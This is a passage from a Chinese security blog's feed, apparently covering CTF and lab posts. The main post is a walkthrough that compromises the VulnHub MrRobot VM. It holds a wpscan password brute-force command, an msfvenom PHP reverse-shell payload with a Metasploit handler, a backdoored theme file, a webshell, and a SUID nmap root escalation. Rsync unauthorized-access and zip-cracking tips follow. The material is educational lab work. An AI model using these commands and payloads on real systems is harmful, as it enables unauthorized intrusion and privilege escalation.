class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        show_error_message(&lt;span class=&quot;string&quot;&gt;&quot;Upload ERROR. Return Code: &quot;&lt;/span&gt; . $_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $check1 = ((($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;type&quot;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            || ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;type&quot;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&quot;image/jpeg&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            || ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;type&quot;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&quot;image/pjpeg&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            || ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;type&quot;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&quot;image/png&quot;&lt;/span&gt;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;amp;&amp;amp; ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;] &amp;lt; &lt;span class=&quot;number&quot;&gt;204800&lt;/span&gt;));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    $check2=!preg_match($reg,pathinfo($_FILES[&lt;span class=&quot;string&quot;&gt;&#39;file-upload-field&#39;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;], PATHINFO_EXTENSION));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($check2) show_error_message(&lt;span class=&quot;string&quot;&gt;&quot;Nope!&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($check1) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        $filename = &lt;span class=&quot;string&quot;&gt;&#39;./uP1O4Ds/&#39;&lt;/span&gt; . random_str() . &lt;span class=&quot;string&quot;&gt;&#39;_&#39;&lt;/span&gt; . $_FILES[&lt;span class=&quot;string&quot;&gt;&#39;file-upload-field&#39;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (move_uploaded_file($_FILES[&lt;span class=&quot;string&quot;&gt;&#39;file-upload-field&#39;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&#39;tmp_name&#39;&lt;/span&gt;], $filename)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            show_message(&lt;span class=&quot;string&quot;&gt;&quot;Upload successfully. File type:&quot;&lt;/span&gt; . $_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file-upload-field&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;type&quot;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; show_error_message(&lt;span class=&quot;string&quot;&gt;&quot;Something wrong with the upload...&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        show_error_message(&lt;span class=&quot;string&quot;&gt;&quot;only allow gif/jpeg/png files smaller than 200kb!&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>文件包含-phar LFI</title>
    <link href="http://yoursite.com/2017/03/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-phar-LFI/"/>
    <id>http://yoursite.com/2017/03/14/文件包含-phar-LFI/</id>
    <published>2017-03-14T07:09:04.000Z</published>
    <updated>2017-03-14T12:47:53.360Z</updated>
    
    <content type="html"><![CDATA[<p>###0x01 什么是phar文件<br>phar文件是一个文件归档包，类似于Java中的Jar文件，方便PHP模块的迁移。php中默认安装了这个模块；</p>
<p>简言之，Phar就是把java界的jar概念迁移到了PHP界，Phar可以将一组PHP文件进行打包，还可以创建默认执行stub，同时Phar可以选择是否进行压缩；</p>
<p>###0x02 创建一个phar文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;###0x01 什么是phar文件&lt;br&gt;phar文件是一个文件归档包，类似于Java中的Jar文件，方便PHP模块的迁移。php中默认安装了这个模块；&lt;/p&gt;
&lt;p&gt;简言之，Phar就是把java界的jar概念迁移到了PHP界，Phar可以将一组PHP文件进行打包，还可以
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>攻破MrRobot-黑客技能训练</title>
    <link href="http://yoursite.com/2016/12/02/%E6%94%BB%E7%A0%B4MrRobot-%E9%BB%91%E5%AE%A2%E6%8A%80%E8%83%BD%E8%AE%AD%E7%BB%83/"/>
    <id>http://yoursite.com/2016/12/02/攻破MrRobot-黑客技能训练/</id>
    <published>2016-12-02T11:28:34.000Z</published>
    <updated>2017-03-21T13:41:59.512Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://download.vulnhub.com/mrrobot/mrRobot.ova" target="_blank" rel="external">MrRobot下载链接</a></p>
<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><h4 id="第一步：找到靶机的ip地址，寄出神器nmap"><a href="#第一步：找到靶机的ip地址，寄出神器nmap" class="headerlink" title="第一步：找到靶机的ip地址，寄出神器nmap"></a>第一步：找到靶机的ip地址，寄出神器nmap</h4><p>开始一直找不到靶机的地址，解决方法，桥接模式且复制物理网络连接状态，重启之后就扫到了<br><img src="http://i1.piimg.com/567571/98f19b9342d67c3e.png" alt=""></p>
<p><img src="http://i1.piimg.com/567571/80535c965880082b.png" alt=""></p>
<h4 id="第二步：打开靶机"><a href="#第二步：打开靶机" class="headerlink" title="第二步：打开靶机"></a>第二步：打开靶机</h4><p><img src="http://ofrdce5qv.bkt.clouddn.com/0f49b2c6de5d84ee.png" alt=""><br><a id="more"></a></p>
<h4 id="第三步：扫描开放的端口"><a href="#第三步：扫描开放的端口" class="headerlink" title="第三步：扫描开放的端口"></a>第三步：扫描开放的端口</h4><p><img src="http://ofrdce5qv.bkt.clouddn.com/2a391542fb78878b.png" alt=""></p>
<h4 id="第四步：利用nikto扫描一下网站"><a href="#第四步：利用nikto扫描一下网站" class="headerlink" title="第四步：利用nikto扫描一下网站"></a>第四步：利用nikto扫描一下网站</h4><p>Nikto是一款开放源代码，功能强大的WEB扫描评估软件，能对服务器多种安全项目进行测试的扫描工具，去寻找已知有名的漏洞；</p>
<p>利用nitko命令可以帮助我们收集像文件信息和其他的主要的信息，渗透之前我们不需了解我们的目标</p>
<ul>
<li>nitko -h 192.168.0.163<br><img src="http://i1.piimg.com/567571/4737661d4c4f78d1.png" alt=""><br>我们很快的得到这是一个wordpress的站<h3 id="注射过程"><a href="#注射过程" class="headerlink" title="注射过程"></a>注射过程</h3></li>
</ul>
<h4 id="前戏"><a href="#前戏" class="headerlink" title="前戏"></a>前戏</h4><p>Ctrl+u查看网站源代码，不过貌似并没有什么卵用，<code>var USER_IP=&#39;208.185.115.6</code>查看另一个ip地址，大概是调用了这个ip地址的js或其它的文件<br><img src="http://p1.bpimg.com/567571/70d82a35997f11fd.png" alt=""><br>根据前面收集到的信息，有robots.txt文件，进行拿站的常规思路，收获了一点点信息<br><img src="http://p1.bpimg.com/567571/20cbb3281410f3e9.png" alt=""><br>根据robots.txt收集到的信息，得到第一个flag<br><img src="http://i1.piimg.com/567571/1e8bc148e8b5b4bf.png" alt=""><br>访问<a href="http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破" target="_blank" rel="external">http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破</a><br><img src="http://p1.bqimg.com/567571/e88bf075db7aac99.png" alt=""></p>
<h4 id="渗透之旅"><a href="#渗透之旅" class="headerlink" title="渗透之旅"></a>渗透之旅</h4><p>根据之前利用nitko扫描到的信息，可以知道网站的后台是/wp-login.php这也是wordpress默认后台的地址</p>
<p>得到了密码字典，紧接着一个问题又跟来了，用户名是什么，继续搞，没有思路了，蓝瘦香菇，突然翻到前面的时候，灵光一闪<br><img src="http://i1.piimg.com/567571/ce5d15f7ecccb946.png" alt=""><br>接着搞起来，然而/fuction,/join等都是找不到页面不应该呀，先把字典下载<br><img src="http://i1.piimg.com/567571/92a5656a736a9994.png" alt=""><br>还是没有思路，明明给了提示咋还是搞不定，原来是自己傻了，明明页面就给了命令端，而自己傻了吧唧的往url上面输，自己笨怪谁呀</p>
<p>接下来我尝试命令<code>inform</code>,展现在眼前的是一个hactivism类型的宣传<br><img src="http://p1.bqimg.com/567571/345dab3f5206037b.jpg" alt=""><br>大约读了读也没有找到可以说没有找到什么有用的信息，当我输入命令<code>question</code>,又是令我费解的产生了几张图片，直觉给我，这里面是充满故事的<br><img src="http://i1.piimg.com/567571/eb93df3c0574e5c8.jpg" alt=""><br>当我试图去搜索<code>executive everyone steals that&#39;s how it works</code>，从google中得到了一个有用的信息，似乎和这道题有关系<code>https://www.tvfanatic.com/quotes/shows/mr-robot/episodes/hellofriendmov/</code>,其中有一个人名Elliot，抱着尝试的态度<br><img src="http://p1.bpimg.com/567571/21d088fd2082f6bb.png" alt=""><br>看到这个错误提醒我知道，用户名正确了，因为之前尝试admin等直接给出的是用户名错误，用户名有了，剩下的就只有利用wpscan来爆破用户名登陆了；<br><img src="http://i1.piimg.com/567571/eda7aaf6237548ed.png" alt=""><br><code>wpscan --url 192.168.0.163 --threads 20--wordlist /root/Desktop/fsocity.dic --username Elliot</code></p>
<pre><code>--threads参数：设置线程
--wordlist参数：设置字典文件的路径
--username参数：设置wordpress的用户名
</code></pre><p>然后就可以顺利登陆进来了<br><img src="http://i1.piimg.com/567571/2efc542d0edf179d.png" alt=""><br>剩下的就是利用wordpress的版本找漏洞了，这里有两个思路，一个就是利用<code>msfvenom</code>生成木马提权，第二个就是利用wordpress版本曝出的漏洞来进行提权渗透</p>
<h4 id="方法一：利用kali中的msfvenm"><a href="#方法一：利用kali中的msfvenm" class="headerlink" title="方法一：利用kali中的msfvenm"></a>方法一：利用kali中的msfvenm</h4><p>msfvenom是一个独立于Metasploit框架之上的后门生成工具，它是原有旧版的msfpayload和msfencode的集合。新版的Metasploit Framework已经没有这两个工具。</p>
<p>常用的参数：</p>
<ul>
<li>-p：需要使用的攻击载荷</li>
<li>-f：输出载荷的格式，可以使用–help-formates列出所有可用格式</li>
<li>-o:指定输出位置</li>
<li>lhost：payload参数，指定反向连接服务端地址</li>
<li>lport：payload参数，指定反向链接服务端端口</li>
<li>-k：配置攻击载荷在独立的线程中启动，不影响宿主程序的运行</li>
<li>查看所有linux可用的payload：msfvenom -l payloads| grep linu</li>
</ul>
<p>生成payload:<code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=1234 -f raw</code><br><img src="http://i1.piimg.com/567571/6fff28dc84860828.png" alt=""><br>复制代码从&lt;php die();到wordpress后台模板并保存<br><img src="http://i1.piimg.com/567571/036db0bce07bc6db.png" alt=""><br>接下来就是注射阶段了</p>
<pre><code>Use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set lhost 192.168.0.107

set lport 4444

exploit
</code></pre><p><img src="http://i1.piimg.com/567571/8575b3bf1079ba55.png" alt=""><br>一旦执行了漏洞，现在需要的就是在浏览器中访问后门文件<code>http://192.168.0.163/wp-content/themes/twentyfifteen/404.php</code><br><img src="http://i1.piimg.com/567571/0e6f9a81fbbb4e2e.png" alt=""><br>成功了，结果还是可喜的<br><img src="http://i1.piimg.com/567571/1e75756ec4bb4e92.png" alt=""><br>这样就可以轻松获取一个webshell了，接下来就是进入目标用户，并可以知道所有的用户类型信息</p>
<pre><code>ls -lsa (获取用户详细的信息)

cd home 

ls -lsa 

cd robot 
</code></pre><p><img src="http://p1.bpimg.com/567571/fc216e55db9427fa.png" alt=""></p>
<p><img src="http://p1.bpimg.com/567571/00be7e9d8960091c.png" alt=""><br>成功了三分之二了，剩下的一关又找不到头绪，但是之前做程序员游戏那个每个信息都是有用的，眼前这个password.raw-md5觉得可以动动脑筋，思路是不会错的,做到后面我才知道，其实我并没有到第二关，看过程<br><img src="http://p1.bqimg.com/567571/8008d2b4066470ab.png" alt=""><br>其中前面的MD5解密后的结果就是下面的密码，我服<br><img src="http://p1.bqimg.com/567571/c66edf66bfcd8e1c.png" alt=""></p>
<p>下面这个就是技巧，干货，利用nmap形成一个interactive shell<br><img src="http://p1.bqimg.com/567571/eaf382603ed7c04d.png" alt=""></p>
<pre><code>nmap 

nmap –interactive（用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中）

!sh（nmap有SUID位，故可以通过“!sh”我们会获取到一个root权限的shell，其含义就是代码由bash shell解释）

id 

cd /root 
</code></pre><p><img src="http://i1.piimg.com/567571/69e055a6f232cfe6.png" alt=""></p>
<h4 id="补充之后又get到的用户名密码"><a href="#补充之后又get到的用户名密码" class="headerlink" title="补充之后又get到的用户名密码"></a>补充之后又get到的用户名密码</h4><p>利用sort命令，它可以帮我们依据不同的数据类型进行排序，-n参数是依照熟知的大小排序<br><img src="http://p1.bqimg.com/567571/e064d2932259b513.png" alt=""><br><img src="http://p1.bqimg.com/567571/40bffdba8eff811f.png" alt=""></p>
<h4 id="方法二：利用wordpress版本漏洞getshell"><a href="#方法二：利用wordpress版本漏洞getshell" class="headerlink" title="方法二：利用wordpress版本漏洞getshell"></a>方法二：利用wordpress版本漏洞getshell</h4><p>经过goole在github找到一个wordpress-shell，链接<a href="https://github.com/leonjza/wordpress-shell" target="_blank" rel="external">wordpress-shell</a></p>
<p>过程：<br><img src="http://p1.bpimg.com/567571/e44ed1c058292763.png" alt=""><br>接着访问<code>http://192.168.0.163/wp-content/plugins/shell/shell.php</code><br>根据readme，访问<code>http://192.168.0.163/wp-content/plugins/shell/shell.php?cmd=id</code><br>这个思路没有搞定，现在直接尝试一句话</p>
<p>利用思路二，从插件，已安装的插件，编辑，插入一句话木马，相对地址<code>/wp-content/plugins/</code><br><img src="http://p1.bqimg.com/567571/c3515f7123cd4ff8.png" alt=""><br>shell相对地址/wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php</p>
<p>菜刀连接:<br><img src="http://p1.bpimg.com/567571/a8d9c05824ac8ea4.png" alt=""><br>翻目录看到<br><img src="http://p1.bpimg.com/567571/c47bbcc0e70bdb39.png" alt=""><br>说明我们这个只是apache用户的权限，robot用户的部分权限。<br><img src="http://p1.bpimg.com/567571/5ee01b34e66c2707.png" alt=""><br>其实方法一我们就可以在知道，下载下来里面的内容是<code>ERROR:// Can Not Read</code>,但是password.raw-md5可以下载，Notepad++打开，可以看到那段密码，这个过程省略</p>
<p>最后就是在webshell执行以下脚本<a href="http://pan.baidu.com/s/1boGz8CJ" target="_blank" rel="external">百度云-密码7k6j</a><br><img src="http://p1.bqimg.com/567571/1bbff7ee5634d833.png" alt=""><br>将数据转发至本机，先反弹回来一个半交互的shell<br><img src="http://p1.bqimg.com/567571/8269ae5f111988d4.png" alt=""><br>由于权限低，利用代码<code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code>获取一个完整的交互式shell</p>
<p><img src="http://p1.bqimg.com/567571/27ab589c8dea3753.png" alt=""></p>
<p>接下来的提权过程和上面就大同小异啦</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>难点就在第三关的提权环节，这一点要回归到Linux文件权限的问题。在Linux中除了文件的基本权限-rwxrwxrwx，还有就是文件的特殊权限，就是SUID和SGID以及SBIT，大致说一下他们的含义</p>
<ul>
<li>SUID含义：SUID shell是一种可用于以拥有者权限运行的shell。也就是说，如果拥有者是root，那你就可能以root的</li>
<li>SGID含义：对文件而言是以文件所属身份执行，而更重要的是对目录的权限</li>
<li>SBIT含义：要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映像，这样做是为了节省大型程序的启动时间，但是会占用系统资源</li>
</ul>
<p>所以我们利用SUID的权限漏洞，利用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找所有用户有SUID权限的文件。<br><img src="http://i1.piimg.com/567571/458762f03a7ea2a1.png" alt=""><br>通过列出的目录发现了nmap，低版本的nmap支持“interactive.”选项，用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中，通过nmap就可以拿到交互的shell，因为nmap有SUID位，所以通过<code>!sh</code>就会获取到一个root权限的shell。</p>
<p><code>最后强调一点，学习nc等，首先要懂socket通信，归根就是网络</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://download.vulnhub.com/mrrobot/mrRobot.ova&quot;&gt;MrRobot下载链接&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;准备阶段&quot;&gt;&lt;a href=&quot;#准备阶段&quot; class=&quot;headerlink&quot; title=&quot;准备阶段&quot;&gt;&lt;/a&gt;准备阶段&lt;/h3&gt;&lt;h4 id=&quot;第一步：找到靶机的ip地址，寄出神器nmap&quot;&gt;&lt;a href=&quot;#第一步：找到靶机的ip地址，寄出神器nmap&quot; class=&quot;headerlink&quot; title=&quot;第一步：找到靶机的ip地址，寄出神器nmap&quot;&gt;&lt;/a&gt;第一步：找到靶机的ip地址，寄出神器nmap&lt;/h4&gt;&lt;p&gt;开始一直找不到靶机的地址，解决方法，桥接模式且复制物理网络连接状态，重启之后就扫到了&lt;br&gt;&lt;img src=&quot;http://i1.piimg.com/567571/98f19b9342d67c3e.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i1.piimg.com/567571/80535c965880082b.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;第二步：打开靶机&quot;&gt;&lt;a href=&quot;#第二步：打开靶机&quot; class=&quot;headerlink&quot; title=&quot;第二步：打开靶机&quot;&gt;&lt;/a&gt;第二步：打开靶机&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://ofrdce5qv.bkt.clouddn.com/0f49b2c6de5d84ee.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试 CTF" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-CTF/"/>
    
  </entry>
  
  <entry>
    <title>模拟渗透测试get到的技巧</title>
    <link href="http://yoursite.com/2016/11/30/%E6%A8%A1%E6%8B%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95get%E5%88%B0%E7%9A%84%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2016/11/30/模拟渗透测试get到的技巧/</id>
    <published>2016-11-30T03:39:54.000Z</published>
    <updated>2016-12-04T14:48:24.169Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-nmap使用技巧"><a href="#一-nmap使用技巧" class="headerlink" title="一 nmap使用技巧"></a>一 nmap使用技巧</h3><p>当针对入口点IP地址进行端口扫描，将其所开放的端口号（仅扫描小于1000的端口），由于在CMD测试，禁止ping，则需要使用到-Pn参数</p>
<p><img src="http://i1.piimg.com/567571/e0a7c3b304ab996b.png" alt=""><br>-vv参数表示输出详细报告结果，-p指定端口扫描，-Pn为扫描前不进行ping操作，如果网站禁止了ping，扫描时不加Pn扫不出开放端口</p>
<h3 id="二-Rsync漏洞"><a href="#二-Rsync漏洞" class="headerlink" title="二 Rsync漏洞"></a>二 Rsync漏洞</h3><p>Rsync,remote synchroniz顾名思义就知道它是一款实现远程同步功能的软件，它在同步文件的同时可以保持原来文件的权限，时间，软硬链接等附加信息。它是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，并可以通过ssh方式来传输文件，这样其保密性也非常好，另外还是免费软件。<br><a id="more"></a></p>
<p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口</p>
<pre><code>nmap -n --open -p 873 x.x.x.x/24
</code></pre><p>找到开放的873端口后，连接能否查看模块名</p>
<pre><code>rsync x.x.x.x::
</code></pre><p>若可以，就尝试上传，下载文件试一下</p>
<p>rsync中有时候存在未授权访问<br><img src="http://i1.piimg.com/567571/f07696c2386a3cf1.png" alt=""><br>rsync 172.16.1.110::  <code>rsync链接</code></p>
<p>rsync 172.16.1.110::www/ <code>列出这个目录下的文件</code></p>
<p>rsync 172.16.1.110::www/flag02 <code>把flag02下载保存到本地root目录</code></p>
<h3 id="三-利用kali-fcrackzip对zip密码压缩文件暴力破解"><a href="#三-利用kali-fcrackzip对zip密码压缩文件暴力破解" class="headerlink" title="三 利用kali fcrackzip对zip密码压缩文件暴力破解"></a>三 利用kali fcrackzip对zip密码压缩文件暴力破解</h3><p>若在ctf比赛中没有现成的zip爆破工具，则可以利用kali中的fcrackzip工具<br><img src="http://p1.bpimg.com/567571/4ec62df6e6d25924.png" alt=""></p>
<pre><code>fcrackzip -b -v -u -c a -l 1-6 1.zip 
 -b参数：指定暴力枚举
 -v参数:显示破解信息
 -u参数：进行解压测试以排除错误密码
 -c参数：指定字符集
 -c a指定的字符集为纯小写字母
 -l参数：指定密码长度
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一-nmap使用技巧&quot;&gt;&lt;a href=&quot;#一-nmap使用技巧&quot; class=&quot;headerlink&quot; title=&quot;一 nmap使用技巧&quot;&gt;&lt;/a&gt;一 nmap使用技巧&lt;/h3&gt;&lt;p&gt;当针对入口点IP地址进行端口扫描，将其所开放的端口号（仅扫描小于1000的端口），由于在CMD测试，禁止ping，则需要使用到-Pn参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i1.piimg.com/567571/e0a7c3b304ab996b.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;-vv参数表示输出详细报告结果，-p指定端口扫描，-Pn为扫描前不进行ping操作，如果网站禁止了ping，扫描时不加Pn扫不出开放端口&lt;/p&gt;
&lt;h3 id=&quot;二-Rsync漏洞&quot;&gt;&lt;a href=&quot;#二-Rsync漏洞&quot; class=&quot;headerlink&quot; title=&quot;二 Rsync漏洞&quot;&gt;&lt;/a&gt;二 Rsync漏洞&lt;/h3&gt;&lt;p&gt;Rsync,remote synchroniz顾名思义就知道它是一款实现远程同步功能的软件，它在同步文件的同时可以保持原来文件的权限，时间，软硬链接等附加信息。它是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，并可以通过ssh方式来传输文件，这样其保密性也非常好，另外还是免费软件。&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Linux常用命令使用总结</title>
    <link href="http://yoursite.com/2016/11/17/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2016/11/17/Linux常用命令使用总结/</id>
    <published>2016-11-17T05:56:23.000Z</published>
    <updated>2017-05-12T08:05:29.057Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-strings命令"><a href="#1-strings命令" class="headerlink" title="1 strings命令"></a>1 strings命令</h3><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印的任意序列，以换行符或空字符结束。strings命令对识别随机对象文件很有用。</p>
<p>语法：</p>
<ul>
<li><p>strings [-a] [-] [-o] [-t Format] [-n Number] [file…]</p>
<a id="more"></a>
<p>   -a –all:扫描整个文件而不是只扫描目标文件初始化和装载段<br>   -：设置显示的最少的字符数，默认是4个字符<br>   -t –radix={o,d,x}:输出字符的位置，基于八进制，十进制还是十六进制<br>   -o:类似–radix=0</p>
<p>  列出ls中所有的ASCII文本：<br>  strings /bin/ls<br>  列出ls中所有的ASCII文本：<br>   cat /bin/ls strings<br>  查找ls中包含libc的字符串，不区分大小写：<br>   strings /bin/ls | grep -i libc</p>
</li>
</ul>
<h3 id="2-grep命令"><a href="#2-grep命令" class="headerlink" title="2 grep命令"></a>2 grep命令</h3><p>grep命令是一个强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来</p>
<p>常用的参数：</p>
<pre><code>-i：忽略大小写的差别
-c：计算符合样式的列数
-n：在显示符合样式的那一行之前，标识出该行的列数编号
-f：指定规则的文本
</code></pre><h3 id="3-mv命令"><a href="#3-mv命令" class="headerlink" title="3 mv命令"></a>3 mv命令</h3><p>mv命令用来对文件或目录重新命名，或者将文件从一个文件移到另一个目录。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移动到另一个已经存在的文件中，则目标文件的内容将会被覆盖。</p>
<p>注意：</p>
<ul>
<li>mv与cp的结果不同，mv好像文件的”搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。</li>
</ul>
<h3 id="4-foremost命令"><a href="#4-foremost命令" class="headerlink" title="4 foremost命令"></a>4 foremost命令</h3><p>foremost是一个根据文件头和内部数据恢复文件的一个工具，在ctf比赛中也比较有用</p>
<ul>
<li>foremost是一个基于文件头和尾部信息以及文件的内建数据恢复文件的命令行工具</li>
</ul>
<p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p>
<pre><code>foremost carter.jpg
</code></pre><h3 id="5-convert命令"><a href="#5-convert命令" class="headerlink" title="5 convert命令"></a>5 convert命令</h3><p>convert是linux下的图片处理工具，在一些ctf比赛的隐写中较常用</p>
<pre><code>convert +append a.gif b.png
b.png是拼接好的图片，意思是将gif图片转换为png
 +append代表是横向拼接
 -append代表是纵向拼接
</code></pre><h3 id="6-unzip命令"><a href="#6-unzip命令" class="headerlink" title="6 unzip命令"></a>6 unzip命令</h3><p>unzip命令用于解压缩由zip命令压缩的<code>.zip</code>压缩包<br>常用的参数：</p>
<ul>
<li><p>-d&lt;目录&gt;：指定文件解压缩后所要存储的目录 </p>
<h3 id="7-tcpdump命令"><a href="#7-tcpdump命令" class="headerlink" title="7 tcpdump命令"></a>7 tcpdump命令</h3><p>tcpdump是一个用于解读网络分组，并输出分组内容的工具。tcpdump凭强大的功能和灵活的截取策略，使其成为<br>类UNXI系统下用于网络分析和问题排查的首选工具</p>
<p>   -w，如果你要将监听所得的数据包数据储存下来，用这个参数就对了。后面接文件名<br>   -O 不运行分组分组匹配（packet-matching）代码优化程序<br>   -s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p>
<h3 id="8-tcpick"><a href="#8-tcpick" class="headerlink" title="8 tcpick"></a>8 tcpick</h3><p>tcpick是一款基于文本的嗅探器，能追踪，重组和重排tcp流</p>
<h3 id="9-WPSCAN"><a href="#9-WPSCAN" class="headerlink" title="9 WPSCAN"></a>9 WPSCAN</h3><p>wpscan是一款针对wordpress的安全扫描软件，可以扫描出wordpress的版本，主题，插件，后台用户以及爆破后台密码等。</p>
<h3 id="10-wc命令"><a href="#10-wc命令" class="headerlink" title="10 wc命令"></a>10 wc命令</h3><p>wc命令的功能为统计指定文件中的字节数，字数，行数，并将统计结果显示输出</p>
</li>
</ul>
<p>常用到的参数：</p>
<pre><code> -c参数：统计字节数
 -l参数：统计行数
 -w参数：统计字数
wc -w flag.dic
</code></pre><h3 id="11-arp-scan命令"><a href="#11-arp-scan命令" class="headerlink" title="11 arp-scan命令"></a>11 arp-scan命令</h3><p>扫描局域网IP地址</p>
<ul>
<li><p>arp-scan -l：查看网段所有的主机</p>
<h3 id="12-sort命令"><a href="#12-sort命令" class="headerlink" title="12 sort命令"></a>12 sort命令</h3><p>sort是一个很有用的命令，它可以帮助我们排序，而且可以根据不同的数据类型进行排序</p>
